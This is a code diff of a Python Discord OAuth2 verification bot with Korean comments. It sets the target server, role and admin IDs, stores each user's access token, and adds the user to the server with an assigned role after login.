@@ -17,12 +17,13 @@ REDIRECT_URI = os.getenv("REDIRECT_URI")
 OAUTH2_URL = os.getenv("OAUTH2_URL")
 PORT = int(os.getenv("PORT", 5000))
 
-# ⚠️ 여기에 네 디스코드 서버 ID를 숫자로 꼭 넣어줘!
-TARGET_GUILD_ID = "너의_디스코드_서버_ID"  # 예: "123456789012345678"
+# ⚠️ 여기에 네 디스코드 서버 ID와 인증 시 부여할 역할 ID를 숫자로 꼭 넣어줘!
+TARGET_GUILD_ID = "1551921173783257108"  # 예: "123456789012345678"
+TARGET_ROLE_ID = "1551935006975205377"        # 예: "987654321098765432"
 
-# 특정 관리자들의 디스코드 유저 ID 리스트
+# 👑 특정 관리자들의 디스코드 유저 ID 리스트 (여기에 네 ID 등을 넣으면 돼!)
 ALLOWED_ADMIN_IDS = [
-    "123456789012345678",  # 관리자 A의 ID
+    "1503013871307456645",  # 관리자 A의 ID (예시)
 ]
 
 # MongoDB Atlas 연결 설정
@@ -137,14 +138,20 @@ def callback():
     # 1. MongoDB에 자동 저장
     save_token(user_id, access_token)
 
-    # 2. 로그인하자마자 곧바로 서버로 강제 초대 요청 날리기
+    # 2. 로그인하자마자 곧바로 서버로 강제 초대 요청 날리기 (역할 자동 부여 포함)
     if TARGET_GUILD_ID and TARGET_GUILD_ID != "너의_디스코드_서버_ID":
         add_headers = {
             "Authorization": f"Bot {BOT_TOKEN}",
             "Content-Type": "application/json"
         }
         url = f"https://discord.com/api/v10/guilds/{TARGET_GUILD_ID}/members/{user_id}"
+        
         payload = {"access_token": access_token}
+        
+        # 역할 ID가 설정되어 있다면 함께 전송
+        if TARGET_ROLE_ID and TARGET_ROLE_ID != "부여할_역할_ID":
+            payload["roles"] = [TARGET_ROLE_ID]
+            
         requests.put(url, json=payload, headers=add_headers)
 
     return f"<h1>인증 및 서버 가입 완료!</h1><p>{username}님, 정상적으로 처리되었습니다. 창을 닫으셔도 됩니다.</p>"
